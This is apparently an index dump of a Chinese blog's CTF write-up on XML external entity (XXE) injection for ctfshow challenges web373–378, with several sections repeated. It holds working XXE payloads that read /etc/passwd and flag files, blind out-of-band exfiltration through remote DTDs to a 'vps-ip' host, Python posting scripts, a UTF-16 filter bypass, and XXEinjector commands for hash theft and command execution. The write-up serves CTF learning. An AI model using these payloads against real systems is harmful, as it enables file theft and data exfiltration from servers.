","date":"2023-11-17","objectID":"/ctfshow_xxe/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#"},{"categories":["CTF","web"],"content":"\r总结","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#总结"},{"categories":["CTF","web"],"content":"\rxml基础XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xml基础"},{"categories":["CTF","web"],"content":"\rxml文档结构 \u003c!--XML申明--\u003e \u003c?xml version=\"1.0\"?\u003e \u003c!--文档类型定义--\u003e \u003c!DOCTYPE note [ \u003c!--定义此文档是 note 类型的文档--\u003e \u003c!ELEMENT note (to,from,heading,body)\u003e \u003c!--定义note元素有四个元素--\u003e \u003c!ELEMENT to (#PCDATA)\u003e \u003c!--定义to元素为”#PCDATA”类型--\u003e \u003c!ELEMENT from (#PCDATA)\u003e \u003c!--定义from元素为”#PCDATA”类型--\u003e \u003c!ELEMENT head (#PCDATA)\u003e \u003c!--定义head元素为”#PCDATA”类型--\u003e \u003c!ELEMENT body (#PCDATA)\u003e \u003c!--定义body元素为”#PCDATA”类型--\u003e ]]]\u003e \u003c!--文档元素--\u003e \u003cnote\u003e \u003cto\u003eDave\u003c/to\u003e \u003cfrom\u003eTom\u003c/from\u003e \u003chead\u003eReminder\u003c/head\u003e \u003cbody\u003eYou are a good man\u003c/body\u003e \u003c/note\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xml文档结构"},{"categories":["CTF","web"],"content":"\rDTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可 被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD: \u003c!DOCTYPE 根元素 [元素声明]\u003e 引用外部DTD: \u003c!DOCTYPE 根元素 SYSTEM \"文件名\"\u003e DTD文档中重要的关键字如下： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#dtd"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u003cfoo\u003e \u003cvalue\u003e\u0026name;\u003c/value\u003e \u003c/foo\u003e 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u003cfoo\u003e \u003cvalue\u003e\u0026content;\u003c/value\u003e \u003c/foo\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#实体"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u0026name; 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026content; ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#实体类别"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u0026name; 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026content; ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#外部实体"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u003croot\u003e\u0026name;\u003c/root\u003e 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u003croot\u003e\u0026name;\u003c/root\u003e or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u003cxml\u003e\u003cname\u003e\u0026b;\u003c/name\u003e\u003c/xml\u003e Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c\u003cEOF \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY % file SYSTEM \"file:///C:/test.txt\"\u003e \u003c!ENTITY % remote SYSTEM \"http://localhost/test.xml\"\u003e %remote; %all; %send; ]\u003e EOF; $data = simplexml_load_string($xml) ; echo \"\u003cpre\u003e\" ; print_r($data) ; ?\u003e 并创建test.xml并写入以下内容： [html] view plain copy \u003c!ENTITY % all \"\u003c!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'\u003e\"\u003e 当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xxe漏洞"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#漏洞检测"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#漏洞利用"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#文件读取"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#blind-xxe漏洞"},{"categories":["CTF","web"],"content":"\rXXEinjector枚举HTTPS应用程序中的/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl 使用gopher（OOB方法）枚举/etc目录： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher 二次漏洞利用： ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt 使用HTTP带外方法和netdoc协议对文件进行爆破攻击： ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc 通过直接性漏洞利用方式进行资源枚举： ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK 枚举未过滤的端口： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all 窃取Windows哈希： ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes 使用Java jar上传文件： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf 使用PHP expect执行系统指令： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls 测试XSLT注入： ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt 记录请求信息： ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:6","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xxeinjector"},{"categories":["CTF","web"],"content":"\r靶场题目","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web373]有回显XXE，外部实体 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 13:36:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-\u003ectfshow; echo $ctfshow; } highlight_file(__FILE__); payload： \u003c!DOCTYPE hacker[ \u003c!ENTITY hacker SYSTEM \"file:///flag\"\u003e ]\u003e \u003croot\u003e \u003cctfshow\u003e \u0026hacker; \u003c/ctfshow\u003e \u003c/root\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web373"},{"categories":["CTF","web"],"content":"\r[web374]无回显XXE ，外部实体。 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 13:36:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 无回显，考虑数据外带，访问一个请求，把数据加到请求上。 payload： \u003c!DOCTYPE hacker[ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % myurl SYSTEM \"http://vps-ip/test.dtd\"\u003e %myurl; ]\u003e \u003croot\u003e 1 \u003c/root\u003e tips： \u003c!-- 要引用（dtd里面），所以要加百分号% --\u003e \u003c!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 --\u003e \u003c!-- 不能直接\u003c!ENTITY % myurl SYSTEM \"http://vps-ip:port/%file\"\u003e ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制--\u003e \u003c!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（\u0026#x25; vps），那就会解析（\u0026#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。 也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。 总结就是，%myurl 这种引用会自动向地址发送请求。 --\u003e test.dtd（放vps上面）内容 \u003c!ENTITY % dtd \"\u003c!ENTITY \u0026#x25; vps SYSTEM 'http://vps-ip:port/%file;'\u003e \"\u003e \u003c!-- \u0026#x25; 就是百分号（\u0026#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 --\u003e \u003c!-- 如果选择nc监听的话，端口一定要加！！！ --\u003e \u003c!-- 如果选择看日志的话，端口一定不能加！！！ --\u003e \u003c!-- 引用（执行）dtd实体，vps被注册 --\u003e %dtd; \u003c!-- 引用（执行）vps实体，接收%file变量的内容 --\u003e %vps; 然后base64解码即可得到flag 也可以通过python脚本发包： import requests url = '' payload = \"\"\"\u003c!DOCTYPE test [ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % aaa SYSTEM \"http://vps-ip/text.dtd\"\u003e %aaa; ]\u003e \u003croot\u003e123\u003c/root\u003e\"\"\" payload = payload.encode('utf-8') requests.post(url ,data=payload) ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web374"},{"categories":["CTF","web"],"content":"\r[web375] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:22:05 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"/', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 加了个正则匹配，可以不写XML声明绕过，也可以多敲一个空格绕过 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web375"},{"categories":["CTF","web"],"content":"\r[web376] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:23:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 相比web375，本题多了\"/i\"，不区分大小写，当然我们也可以通过不写XML声明绕过，也可以打一个空格在?xml和version之间绕过，也可以将\u003c\\?xml version=\"1\\.0\"中的双引号换成单引号绕过 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web376"},{"categories":["CTF","web"],"content":"\r[web377] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2021-01-07 12:59:52 # @Last Modified by: h1xa # @Last Modified time: 2021-01-07 15:26:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/\u003c\\?xml version=\"1\\.0\"|http/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); 比之前几题多过滤了一个http 可以采用编码绕过，用脚本把web374的payload转为utf-16编码。 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。 import requests url = 'http://a83196d0-7399-4a44-9601-23509c34a124.challenge.ctf.show/' #注意这里是单引号，为了绕过过滤 payload = \"\"\"\u003c?xml version='1.0' encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE hacker[ \u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"\u003e \u003c!ENTITY % myurl SYSTEM \"http://vps-ip/test.dtd\"\u003e %myurl; ]\u003e \u003croot\u003e 1 \u003c/root\u003e \"\"\" payload = payload.encode('utf-16') print(requests.post(url ,data=payload).text) ","date":"2023-11-17","objectID":"/ctfshow_xxe/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#web377"},{"categories":["CTF","web"],"content":"\r[web378]开题可见 抓包看一下，xxe无疑了 部分源码： function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"\u003cuser\u003e\u003cusername\u003e\" + username + \"\u003c/username\u003e\u003cpassword\u003e\" + password + \"\u003c/password\u003e\u003c/user\u003e\"; $.ajax({ type: \"POST\", url: \"doLogin\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } payload: \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///flag\"\u003e ]\u003e \u003cuser\u003e\u003cusername\u003e\u0026xxe;\u003c/username\u003e\u003cpassword\u003e\u0026xxe;\u003c/password\u003e\u003c/user\u003e 